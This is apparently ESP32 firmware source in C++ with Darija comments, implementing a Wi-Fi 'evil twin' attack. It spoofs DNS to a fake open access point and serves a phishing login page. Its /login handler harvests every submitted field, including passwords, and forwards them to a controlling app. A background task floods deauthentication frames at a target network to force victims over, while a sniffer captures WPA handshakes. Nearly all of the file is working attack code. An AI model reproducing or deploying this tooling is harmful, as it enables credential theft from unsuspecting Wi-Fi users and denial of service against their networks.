#include "portal.h"
#include "sniffer.h"

namespace {
constexpr size_t HTML_APPEND_MARGIN = 32;
constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;

void addNoCacheHeaders(AsyncWebServerResponse* response) {
    if (!response) return;
    response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    response->addHeader("Pragma", "no-cache");
    response->addHeader("Expires", "0");
}
}  // namespace

void PortalManager::begin(BridgeProtocol& proto) {
    _proto = &proto;
}

void PortalManager::setupDNSSpoof() {
    if (!_dnsServer) _dnsServer = new DNSServer();
    _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
}

// استعملنا const char* عوض String باش نوكلو الذاكرة
const char* LOADING_HTML = "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2'><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}.spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}@keyframes spin{to{transform:rotate(360deg);}}p{opacity:0.7;font-size:14px;}</style></head><body><div class='spinner'></div><p>Connecting...</p></body></html>";

void PortalManager::setupRoutes() {
    // 1. عرض صفحة HTML المخصصة
    _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        // إرسال الحدث للتطبيق (خفيف)
        if (_proto) {
            JsonDocument ev;
            ev["type"] = "portal_viewed";
            ev["client_ip"] = request->client()->remoteIP().toString();
            _proto->sendEvent("portal_viewed", ev);
        }

        // إرسال الصفحة (نستعملو _htmlBuffer مباشرة باش نوكلو الرام)
        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
            resp->addHeader("Content-Length", String(_htmlLen));
            addNoCacheHeaders(resp);
            request->send(resp);
        } else {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", LOADING_HTML);
            addNoCacheHeaders(resp);
            request->send(resp);
        }
    });

    // 2. مسار /login : القناص (استقبال كلمة السر وطردها فوراً)
    _server->on("/login", HTTP_ANY, [this](AsyncWebServerRequest* request) {
        // بناء JSON صغير جداً (خفيف)
        JsonDocument doc;
        doc["type"] = "captive_data";
        doc["ip"] = request->client()->remoteIP().toString();
        doc["timestamp"] = millis();

        JsonObject data = doc["data"].to<JsonObject>();
        int params = request->args();
        for (int i = 0; i < params; i++) {
            // نبعثو مباشرة بلا متغيرات String
            data[request->argName(i).c_str()] = request->arg(i).c_str();
        }

        // إرسال للتطبيق فوراً
        if (_proto) _proto->sendEvent("captive_data", doc);

        // الرد السريع (أخف رد ممكن باش المتصفح ما يعلقش)
        request->send(200, "text/html", "<html><body style='text-align:center;padding-top:20px;'><h2>Connecting...</h2></body></html>");
    });

    // 3. سد منافذ أندرويد وآبل الوهمية (باش ما يستهلكوش الرام)
    _server->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(204); });
    _server->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(204); });
    _server->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"); });
    _server->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/plain", "Microsoft Connect Test"); });
    _server->on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/plain", "Microsoft NCSI"); });
    _server->on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"); });

    // 4. أي طلب آخر، رجعو للصفحة الرئيسية
    _server->onNotFound([](AsyncWebServerRequest* request) {
        request->redirect("http://192.168.4.1/");
    });
}

void PortalManager::deauthTaskFn(void* pv) {
    auto* self = (PortalManager*)pv;
    uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
    memcpy(frame+10, self->_targetBssid, 6);
    memcpy(frame+16, self->_targetBssid, 6);

    uint16_t seq = 0x0010;
    while (self->_running) {
        for (int i=0; i<10; i++) {
            frame[22] = seq&0xFF; frame[23]=(seq>>8)&0xFF;
            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
            seq += 0x0010;
            delay(10);
        }
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_BURST_PAUSE_MS));
    }
    vTaskDelete(NULL);
}

bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid, String* error) {
    stop(); 
    WiFi.mode(WIFI_MODE_APSTA);
    delay(100);
    bool apOk = WiFi.softAP(ssid, nullptr, channel);
    if (!apOk) { if (error) *error = "softAP creation failed"; return false; }
    bool cfgOk = WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
    if (!cfgOk) { if (error) *error = "softAP DHCP configuration failed"; return false; }

    wifi_config_t cfg{};
    esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
    if (err == ESP_OK) {
        cfg.ap.channel = channel;
        err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    }
    if (err != ESP_OK) {
        if (error) { *error = "AP channel configuration failed: "; *error += esp_err_to_name(err); }
        return false;
    }

    err = esp_wifi_start();
    if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
        if (error) { *error = "WiFi start failed: "; *error += esp_err_to_name(err); }
        return false;
    }
    delay(300);

    _server = new AsyncWebServer(80);
    setupDNSSpoof();
    setupRoutes();
    _server->begin();

    _running = true;
    if (targetBssid) {
        memcpy(_targetBssid, targetBssid, 6);
        _hasTarget = true;
        Sniffer::instance()->setEapolFilter(true, targetBssid);
        Sniffer::instance()->startFixed(channel);
        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
    }
    return true;
}

// ... (باقي الدوال setHtmlChunk, resetHtml, update, stop كيفما هي في الكود الأصلي)
